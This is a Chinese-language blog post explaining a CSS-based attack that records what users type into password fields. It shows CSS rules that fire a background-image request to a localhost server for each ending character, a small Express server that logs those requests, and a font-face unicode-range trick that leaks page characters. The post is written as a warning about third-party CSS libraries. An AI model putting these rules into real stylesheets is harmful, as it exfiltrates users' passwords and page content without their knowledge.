---
layout: post
title:  "CSS攻击：记录用户密码"
date:   2018-03-01
categories: CSS
author: 张翔
location: ShangHai, China
cover: "https://meetsup.oss-cn-hangzhou.aliyuncs.com/blog-images/article21/vulnerable-to-css-exfil-attack.jpg"
description: CSS也能成为攻击者的使用工具，用来记录用户的输入数据。
---
---
简单的CSS代码，甚至不符合图灵完备的语言，但是也能成为一些攻击者的工具，下面简单介绍一下如何使用CSS去记录用户的密码。但是这些CSS脚本会出现在第三方CSS库中，所以使用第三方CSS库也需要谨慎，确保代码安全。
直接上代码解析：
```CSS
input[type="password"][value$="0"] { 
    background-image: url("http://localhost:3000/0"); 
}
input[type="password"][value$="1"] { 
    background-image: url("http://localhost:3000/1"); 
}
input[type="password"][value$="2"] { 
    background-image: url("http://localhost:3000/2"); 
}
```

以上是**部分代码**,我们来解析一下CSS代码
`input[type="password"]`是css选择器，作用是选择密码输入框，`[value$="0"]`表示匹配输入的值是以0结尾的。
所以：
```CSS
input[type="password"][value$="0"] { 
    background-image: url("http://localhost:3000/0"); 
}
```
上面代码的意思就是如果你在密码框中输入0，就去请求`http://localhost:3000/0`接口，但是浏览器**默认情况下**是不会将用户输入的值存储在**value属性**中，但是有的框架会同步这些值，例如**React**。
所以只要使用了如下图的脚本就能去存储用户的输入数据信息。
![data](https://meetsup.oss-cn-hangzhou.aliyuncs.com/blog-images/article21/data.jpg)

我们再来看一下服务器端的代码
```javaScript
const express = require("express");
const app = express();

app.get("/:key", (req, res) => {
process.stdout.write(req.params.key);
return res.sendStatus(400);
});

app.listen(3000, () => console.log("启动，监听3000端口"));
```

使用**express**创建服务器，监听**3000端口**，只要请求`http://localhost:3000/:key`，就能输出key的值，**就能在服务器上记录输入的值**。
所以只要在每输入一个值都匹配，然后通过 `background-image` 去请求一个已经准备好的**接口**，就能记录用户的输入。

类似的方法记录用户的内容的CSS代码
```CSS
@font-face {
  font-family: blah;
  src: url('http://localhost:3000/a') format('woff');
  unicode-range: U+85;
}
html {
  font-family: blah, sans-serif;
}
```
你使用的的css的简单的**字体库**，只要你的页面中包含a，就会去请求`http://localhost:3000/a`，这样就能知道你的页面中包含有a字符。